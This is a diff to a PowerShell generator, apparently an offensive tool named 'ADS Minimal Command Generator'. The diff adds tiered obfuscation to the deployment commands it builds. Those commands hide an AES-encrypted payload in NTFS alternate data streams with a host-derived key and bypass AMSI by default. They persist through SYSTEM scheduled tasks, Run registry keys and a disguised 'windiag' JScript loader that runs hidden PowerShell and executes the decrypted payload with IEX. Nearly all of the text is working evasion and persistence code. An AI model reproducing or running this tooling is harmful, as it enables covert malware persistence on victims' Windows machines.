@@ -99,6 +99,10 @@ param(
     
     [switch]$Encrypt,
     [switch]$Randomize,
+
+    # Unified obfuscation level — controls naming, placement, and ZW injection
+    [ValidateSet('None', 'Basic', 'Advanced', 'Paranoid')]
+    [string]$Obfuscate = 'Advanced',
     
     # Deep placement - resolve path on target at runtime
     [switch]$UseDeepPlacement,
@@ -115,6 +119,20 @@ param(
     # Opt out of AMSI bypass (bypass is ON by default)
     [switch]$NoAmsi
 )
+
+# --- Tier-implied defaults (individual params override) ---
+if ($Obfuscate -in @('Advanced', 'Paranoid')) {
+    if (-not $PSBoundParameters.ContainsKey('UseDeepPlacement')) { $UseDeepPlacement = [switch]::new($true) }
+    if (-not $PSBoundParameters.ContainsKey('AttachToExisting')) { $AttachToExisting = [switch]::new($true) }
+    if (-not $PSBoundParameters.ContainsKey('Randomize')) { $Randomize = [switch]::new($true) }
+}
+if ($Obfuscate -eq 'Paranoid') {
+    if (-not $PSBoundParameters.ContainsKey('ZeroWidthStreams')) { $ZeroWidthStreams = [switch]::new($true) }
+}
+# Backward compat: -ZeroWidthStreams without explicit -Obfuscate upgrades to Paranoid
+if ($ZeroWidthStreams -and -not $PSBoundParameters.ContainsKey('Obfuscate')) {
+    $Obfuscate = 'Paranoid'
+}
 
 Write-Host "`n╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
 Write-Host "║ ADS Minimal Command Generator v2.3                  ║" -ForegroundColor Cyan
@@ -336,6 +354,7 @@ Write-Host "[*] Generating configuration..." -ForegroundColor White
 
 $params = @{
     Payload = if ($PayloadAtDeployment) { "PLACEHOLDER" } else { $Payload }
+    Obfuscate = $Obfuscate
     ZeroWidthStreams = $ZeroWidthStreams
     ZeroWidthMode = $ZeroWidthMode
     Persist = $Persist
@@ -378,35 +397,38 @@ if (-not $NoAmsi) {
 Write-Host "[*] Building minimal deployment commands..." -ForegroundColor White
 
 # Helper functions needed on Windows (minimal versions)
-$helperFunctions = @'
+# Function names use obfuscated values from config
+$ghkName = $config.GHKFunctionName
+$decName = $config.DecFunctionName
+$helperFunctions = @"
 # Host-derived AES key function
-function Get-HostKey {
-    $h = @($env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber) -join '|'
-    [System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($h))
+function $ghkName {
+    `$h = @(`$env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber) -join '|'
+    [System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(`$h))
 }
 
 # Encrypt function (compact)
-function Enc($t,$k) {
-    $a=[Security.Cryptography.Aes]::Create()
-    $a.Key=$k;$a.GenerateIV()
-    $e=$a.CreateEncryptor()
-    $p=[Text.Encoding]::UTF8.GetBytes($t)
-    $b=$e.TransformFinalBlock($p,0,$p.Length)
-    [Convert]::ToBase64String($a.IV+$b)
+function Enc(`$t,`$k) {
+    `$a=[Security.Cryptography.Aes]::Create()
+    `$a.Key=`$k;`$a.GenerateIV()
+    `$e=`$a.CreateEncryptor()
+    `$p=[Text.Encoding]::UTF8.GetBytes(`$t)
+    `$b=`$e.TransformFinalBlock(`$p,0,`$p.Length)
+    [Convert]::ToBase64String(`$a.IV+`$b)
 }
 
 # Decrypt function (compact)
-function Dec($d,$k) {
-    $b=[Convert]::FromBase64String($d)
-    $a=[Security.Cryptography.Aes]::Create()
-    $a.Key=$k;$a.IV=$b[0..15]
-    $c=$a.CreateDecryptor()
-    $t=$b[16..($b.Length-1)]
-    $p=$c.TransformFinalBlock($t,0,$t.Length)
-    [Text.Encoding]::UTF8.GetString($p)
+function $decName(`$d,`$k) {
+    `$b=[Convert]::FromBase64String(`$d)
+    `$a=[Security.Cryptography.Aes]::Create()
+    `$a.Key=`$k;`$a.IV=`$b[0..15]
+    `$c=`$a.CreateDecryptor()
+    `$t=`$b[16..(`$b.Length-1)]
+    `$p=`$c.TransformFinalBlock(`$t,0,`$t.Length)
+    [Text.Encoding]::UTF8.GetString(`$p)
 }
 
-'@
+"@
 
 # Start building the minimal command script
 $minimalScript = ""
@@ -491,7 +513,7 @@ do{`$line=Read-Host;if(`$line){`$lines+=`$line}}while(`$line)
 if ($Encrypt) {
     $minimalScript += @"
 # Encrypt payload
-`$k=Get-HostKey
+`$k=$ghkName
 `$pl=Enc `$pl `$k
 
 "@
@@ -660,11 +682,11 @@ if(!(Test-Path `$hp)){ni `$hp -ItemType File -Force|Out-Null}
 `$_jsBody=@'
 var shell = new ActiveXObject("WScript.Shell");
 var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
-    "function Get-HostKey{" +
+    "function __GHKNAME__{" +
         "`$h=@(`$env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join[char]124;" +
         "[System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(`$h))" +
     "};" +
-    "function Dec(`$d,`$k){" +
+    "function __DECNAME__(`$d,`$k){" +
         "`$b=[Convert]::FromBase64String(`$d);" +
         "`$a=[Security.Cryptography.Aes]::Create();" +
         "`$a.Key=`$k;`$a.IV=`$b[0..15];" +
@@ -673,15 +695,15 @@ var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Execut
         "`$p=`$c.TransformFinalBlock(`$t,0,`$t.Length);" +
         "[Text.Encoding]::UTF8.GetString(`$p)" +
     "};" +
-    "`$k=Get-HostKey;" +
+    "`$k=__GHKNAME__;" +
     "`$_sn=__SNEXPR__;" +
     "`$e=Get-Content ('__HOSTPATH__:'+`$_sn) -Raw;" +
-$jsAmsiLine    "`$p=Dec `$e `$k;" +
+$jsAmsiLine    "`$p=__DECNAME__ `$e `$k;" +
     "IEX `$p" +
     "\"";
 shell.Run(cmd, 0, false);
 '@
-`$_jsBody=`$_jsBody.Replace('__SNEXPR__',`$_snEsc).Replace('__HOSTPATH__',`$_hpEsc)
+`$_jsBody=`$_jsBody.Replace('__SNEXPR__',`$_snEsc).Replace('__HOSTPATH__',`$_hpEsc).Replace('__GHKNAME__','$($config.GHKFunctionName)').Replace('__DECNAME__','$($config.DecFunctionName)')
 `$_jsDir=Split-Path `$hp -Parent;if(-not `$_jsDir){`$_jsDir=`$env:ProgramData}
 `$_jsPath=Join-Path `$_jsDir ("windiag_`$(Get-Random).js")
 `$_jsBody|Out-File -FilePath `$_jsPath -Encoding ASCII -Force
@@ -731,9 +753,11 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$_triggers -Settings
     } elseif ($Persist -eq 'registry') {
         # Registry persistence — Run keys for logon/startup + companion task for periodic/cheeky triggers
 
-        # Build the registry value command
+        # Build the registry value command (function names from obfuscation config)
+        $_ghk = $config.GHKFunctionName
+        $_dec = $config.DecFunctionName
         if ($Encrypt) {
-            $regPayloadCmd = 'function GHK{$h=@($env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join[char]124;[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($h))};function Dec($d,$k){$b=[Convert]::FromBase64String($d);$a=[Security.Cryptography.Aes]::Create();$a.Key=$k;$a.IV=$b[0..15];$c=$a.CreateDecryptor();$t=$b[16..($b.Length-1)];$p=$c.TransformFinalBlock($t,0,$t.Length);[Text.Encoding]::UTF8.GetString($p)};$k=GHK;$e=gc ' + "'" + '$hp' + ':' + '$sn' + "'" + ' -Raw;IEX(Dec $e $k)'
+            $regPayloadCmd = "function ${_ghk}" + '{$h=@($env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join[char]124;[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($h))};' + "function ${_dec}" + '($d,$k){$b=[Convert]::FromBase64String($d);$a=[Security.Cryptography.Aes]::Create();$a.Key=$k;$a.IV=$b[0..15];$c=$a.CreateDecryptor();$t=$b[16..($b.Length-1)];$p=$c.TransformFinalBlock($t,0,$t.Length);[Text.Encoding]::UTF8.GetString($p)};' + "`$k=${_ghk};" + '$e=gc ' + "'" + '$hp' + ':' + '$sn' + "'" + " -Raw;IEX(${_dec} " + '$e $k)'
         } else {
             $regPayloadCmd = 'IEX(gc ' + "'" + '$hp' + ':' + '$sn' + "'" + ' -Raw)'
         }
@@ -792,11 +816,11 @@ if(`$_isAdmin){Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentV
 `$_jsBody=@'
 var shell = new ActiveXObject("WScript.Shell");
 var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
-    "function Get-HostKey{" +
+    "function __GHKNAME__{" +
         "`$h=@(`$env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join[char]124;" +
         "[System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(`$h))" +
     "};" +
-    "function Dec(`$d,`$k){" +
+    "function __DECNAME__(`$d,`$k){" +
         "`$b=[Convert]::FromBase64String(`$d);" +
         "`$a=[Security.Cryptography.Aes]::Create();" +
         "`$a.Key=`$k;`$a.IV=`$b[0..15];" +
@@ -805,15 +829,15 @@ var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Execut
         "`$p=`$c.TransformFinalBlock(`$t,0,`$t.Length);" +
         "[Text.Encoding]::UTF8.GetString(`$p)" +
     "};" +
-    "`$k=Get-HostKey;" +
+    "`$k=__GHKNAME__;" +
     "`$_sn=__SNEXPR__;" +
     "`$e=Get-Content ('__HOSTPATH__:'+`$_sn) -Raw;" +
-$jsAmsiLineCompanion    "`$p=Dec `$e `$k;" +
+$jsAmsiLineCompanion    "`$p=__DECNAME__ `$e `$k;" +
     "IEX `$p" +
     "\"";
 shell.Run(cmd, 0, false);
 '@
-`$_jsBody=`$_jsBody.Replace('__SNEXPR__',`$_snEsc).Replace('__HOSTPATH__',`$_hpEsc)
+`$_jsBody=`$_jsBody.Replace('__SNEXPR__',`$_snEsc).Replace('__HOSTPATH__',`$_hpEsc).Replace('__GHKNAME__','$($config.GHKFunctionName)').Replace('__DECNAME__','$($config.DecFunctionName)')
 
 "@
         } else {
@@ -841,7 +865,7 @@ shell.Run(cmd, 0, false);
 `$a=New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "//B //E:JScript ```"`$_jsPath```""
 $(Build-TriggerBlock)
 `$p=New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-`$_ctn=`$tn+'_Companion'
+`$_ctn=`$tn+'$($config.TaskSuffix)'
 Register-ScheduledTask -TaskName `$_ctn -Action `$a -Trigger `$_triggers -Settings `$_stg -Principal `$p -Force -EA SilentlyContinue|Out-Null
 
 "@
@@ -961,7 +985,11 @@ if (-not $PayloadAtDeployment) {
         OutputFile        = $OutputFile
         JScriptLoaderNote = "Created at runtime: <host_dir>\windiag_<random>.js"
         RegistryPath      = if ($Persist -eq 'registry') { "HKCU" + $(if ($Trigger -contains 'AtStartup') { " + HKLM (if admin)" }) + ":\...\Run" } else { $null }
-        CompanionTaskNote = if ($Persist -eq 'registry') { "Companion task: <TaskName>_Companion (periodic+cheeky triggers)" } else { $null }
+        CompanionTaskNote = if ($Persist -eq 'registry') { "Companion task: <TaskName>$($config.TaskSuffix) (periodic+cheeky triggers)" } else { $null }
+        ObfuscationLevel  = $config.ObfuscationLevel
+        GHKFunctionName   = $config.GHKFunctionName
+        DecFunctionName   = $config.DecFunctionName
+        TaskSuffix        = $config.TaskSuffix
     }
     
     $manifest | ConvertTo-Json -Depth 10 | Out-File -FilePath $manifestFile -Encoding UTF8 -Force
@@ -1039,7 +1067,7 @@ Unregister-ScheduledTask -TaskName '$($config.TaskName)' -Confirm:`$false
 Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name '$($config.TaskName)' -EA 0
 Remove-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -Name '$($config.TaskName)' -EA 0
 # Remove companion task
-Unregister-ScheduledTask -TaskName '$($config.TaskName)_Companion' -Confirm:`$false -EA 0
+Unregister-ScheduledTask -TaskName '$($config.TaskName)$($config.TaskSuffix)' -Confirm:`$false -EA 0
 "@
 })
 
